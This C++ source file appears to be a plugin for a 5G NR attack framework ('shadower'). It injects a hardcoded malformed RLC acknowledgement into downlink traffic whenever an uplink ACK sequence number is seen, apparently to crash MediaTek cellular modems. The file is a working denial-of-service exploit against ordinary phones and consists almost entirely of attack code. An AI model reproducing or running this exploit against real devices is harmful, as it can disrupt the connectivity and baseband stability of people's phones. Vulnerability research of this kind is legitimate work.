#include "shadower/modules/exploit.h"

const uint8_t malformed_ack[] = {0x41,
                                 0x00,
                                 0x03,
                                 0x84,
                                 0x01,
                                 0x00,
                                 0x3f,
                                 0x00,
                                 0x00,
                                 0x00,
                                 0x00}; // Change RLC PDU from Control to Data and set Sequence number to 1025

class MacSchMTKRLCCrash : public Exploit
{
public:
  MacSchMTKRLCCrash(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                    SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_) :
    Exploit(dl_buffer_queue_, ul_buffer_queue_)
  {
    msg.reset(new std::vector<uint8_t>(malformed_ack, malformed_ack + sizeof(malformed_ack)));
  }

  void setup() override { f_sn = wd_field("rlc-nr.am.ack-sn"); }

  void pre_dissection(wd_t* wd) override { wd_register_field(wd, f_sn); }

  void post_dissection(wd_t*                 wd,
                       uint8_t*              buffer,
                       uint32_t              len,
                       uint8_t*              raw_buffer,
                       uint32_t              raw_buffer_len,
                       direction_t           direction,
                       uint32_t              slot_idx,
                       srslog::basic_logger& logger) override
  {
    if (direction == UL) {
      // If UL message received from the base station, then we have to send the ACK back to UE
      wd_field_info_t sn_info = wd_read_field(wd, f_sn);
      if (sn_info) {
        dl_buffer_queue.push(msg);
        logger.info("Received msg with SN sending malformed ACK");
      }
    }
  }

private:
  wd_field_t                             f_sn;
  std::shared_ptr<std::vector<uint8_t> > msg;
};

extern "C" {
__attribute__((visibility("default"))) Exploit* create_exploit(SafeQueue<std::vector<uint8_t> >& dl_buffer_queue_,
                                                               SafeQueue<std::vector<uint8_t> >& ul_buffer_queue_)
{
  return new MacSchMTKRLCCrash(dl_buffer_queue_, ul_buffer_queue_);
}
}